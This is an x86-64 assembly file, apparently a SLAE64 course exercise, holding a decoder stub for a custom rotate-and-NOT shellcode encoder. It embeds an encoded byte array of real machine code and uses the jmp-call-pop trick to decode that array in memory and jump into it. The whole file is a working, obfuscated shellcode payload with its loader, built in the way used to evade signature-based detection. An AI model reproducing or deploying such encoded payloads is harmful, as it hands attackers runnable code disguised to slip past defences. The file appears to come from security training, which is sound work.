; Andrea Bruna SLAE64 - 1493
; Decoder for the "Rot17_Not_Jump2Opcodes" encoder

global _start 

section .text

_start:

	jmp find_address ; use the jump-call-pop trick to get the address
			 ; of encoded_shellcode...
decoder:
	pop rsi ; ...and pop in rsi
	push rsi 
	pop rdi ; copy rsi in rdi
	push rdi
	pop rcx ; and rcx
	add rcx,length ; add to rcx the length of the shellcode so we know when to stop decoding
decode:
	mov al, byte [rsi] ; mov the byte pointed by rsi in al
	not al ; not the value
	sub al,17 ; subtract 17 
	mov byte [rdi], al ; move the resulting byte in rdi
	inc rdi ; increase rdi
	add rsi,3 ; add 3 to rsi in order to skip reading the two junk bytes between the actual shellcode bytes
	cmp rsi,rcx ; are we at the end of encoded_shellcode?
	jnz decode ; No? Jump back to decode and continue decoding. 
	jmp short encoded_shellcode ; jump to the decoded shellcode 

find_address:
	call decoder
encoded_shellcode: db 0xa6,0x0a,0x35,0xbd,0x8f,0xb9,0x2e,0x82,0xe5,0x9e,0x1e,0x10,0xa6,0x61,0xfe,0x33,0x96,0xcf,0xbf,0xf4,0x65,0x8c,0x41,0xd7,0x85,0x46,0xdc,0x80,0xce,0x02,0xbf,0xb6,0xee,0xbf,0xc1,0x88,0x7b,0x3a,0x94,0x86,0x03,0x95,0x9b,0x98,0x46,0xa6,0x04,0x81,0x65,0x90,0x1d,0x07,0xc5,0x0b,0x9e,0xd6,0x49,0xa6,0xdd,0xf2,0x65,0xd9,0xb3,0x0c,0xc8,0x64,0x97,0x12,0xe8,0xa6,0x88,0xd0,0x65,0x3b,0xce,0x08,0x8a,0xbd,0xa6,0x1f,0xc4,0x6b,0xe7,0x15,0x2e,0xf6,0x80,0xb3,0x35,0x46,0xdf,0xa3,0x67,0xe9,0x32,0x81
length: equ $-encoded_shellcode
